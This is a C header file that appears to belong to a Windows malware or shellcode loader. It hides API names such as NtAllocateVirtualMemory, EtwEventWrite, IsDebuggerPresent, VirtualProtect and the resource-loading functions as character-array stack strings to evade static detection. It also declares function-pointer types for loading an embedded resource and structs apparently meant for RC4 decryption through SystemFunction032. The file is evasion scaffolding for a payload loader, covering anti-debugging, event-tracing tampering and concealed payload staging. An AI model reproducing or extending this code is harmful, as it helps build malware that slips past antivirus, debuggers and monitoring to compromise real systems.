#pragma once

// DLL
char strntdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
WCHAR wstrntdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
char strkernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
WCHAR wstrkernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
char stradvapi32dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };
WCHAR wstradvapi32dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };
char strWtsApi32dll[] = { 'W','t','s','A','p','i','3','2','.','d','l','l', 0x0 };
WCHAR wstrWtsApi32dll[] = { 'W','t','s','A','p','i','3','2','.','d','l','l', 0x0 };

// NT
char strNtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

// Kernel32
char strIsDebuggerPresent[] = { 'I','s','D','e','b','u','g','g','e','r','P','r','e','s','e','n','t', 0x0 };
char strCheckRemoteDebuggerPresent[] = { 'C','h','e','c','k','R','e','m','o','t','e','D','e','b','u','g','g','e','r','P','r','e','s','e','n','t', 0x0 };
char strGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A', 0x0 };
char strGetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A', 0x0 };
char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
char strFindResourceW[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','W', 0x0 };
char strLoadResource[] = { 'L','o','a','d','R','e','s','o','u','r','c','e', 0x0 };
char strLockResource[] = { 'L','o','c','k','R','e','s','o','u','r','c','e', 0x0 };
char strSizeofResource[] = { 'S','i','z','e','o','f','R','e','s','o','u','r','c','e', 0x0 };
char strFreeResource[] = { 'F','r','e','e','R','e','s','o','u','r','c','e', 0x0 };
char strLoadLibraryW[] = { 'L','o','a','d','L','i','b','r','a','r','y','W', 0x0 };
char strFreeLibrary[] = { 'F','r','e','e','L','i','b','r','a','r','y', 0x0 };

// WTSAPI32
char strwtsEnumProc[] = { 'W','T','S','E','n','u','m','e','r','a','t','e','P','r','o','c','e','s','s','e','s','A' };
WCHAR wstrwtsEnumProc[] = { 'W','T','S','E','n','u','m','e','r','a','t','e','P','r','o','c','e','s','s','e','s','A' };


typedef HRSRC (WINAPI* t_FindResourceW)(
	_In_opt_ HMODULE hModule,
	_In_ LPCWSTR lpName,
	_In_ LPCWSTR lpType
);

typedef HGLOBAL (WINAPI* t_LoadResource)(
	_In_opt_ HMODULE hModule,
	_In_ HRSRC hResInfo
);

typedef LPVOID (WINAPI* t_LockResource)(
	_In_ HGLOBAL hResData
);

typedef DWORD (WINAPI* t_SizeofResource)(
	_In_opt_ HMODULE hModule,
	_In_ HRSRC hResInfo
);

typedef BOOL (WINAPI* t_FreeResource)(
	_In_ HGLOBAL hResData
);

typedef HMODULE (WINAPI* t_LoadLibraryW)(
	_In_ LPCWSTR lpLibFileName
);

typedef BOOL (WINAPI* t_FreeLibrary)(
	_In_ HMODULE hLibModule
);

// SYSFUNC
// char strSystemFunction032[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2', 0x0 };

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;